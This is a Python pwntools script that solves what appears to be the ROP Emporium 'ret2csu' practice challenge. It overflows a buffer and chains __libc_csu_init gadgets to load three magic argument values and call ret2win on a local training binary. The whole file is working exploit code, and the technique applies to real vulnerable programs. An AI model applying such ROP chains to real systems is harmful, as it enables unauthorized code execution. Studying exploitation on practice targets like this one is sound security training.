from pwn import*
p=process('./ret2csu')
elf=ELF('./ret2csu')

ret2win_plt=elf.plt['ret2win']
rop1_addr=0x40069a
rop2_addr=0x400680
pop_rdi=0x4006a3
init_addr=0x600e48

payload=b'a'*40
payload+=p64(rop1_addr)
payload+=p64(0)
payload+=p64(1)
payload+=p64(init_addr)
payload+=p64(0)
payload+=p64(0xCAFEBABECAFEBABE)
payload+=p64(0xD00DF00DD00DF00D)
payload+=p64(rop2_addr)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(pop_rdi)
payload+=p64(0xDEADBEEFDEADBEEF)
payload+=p64(ret2win_plt)
p.sendline(payload)
p.interactive()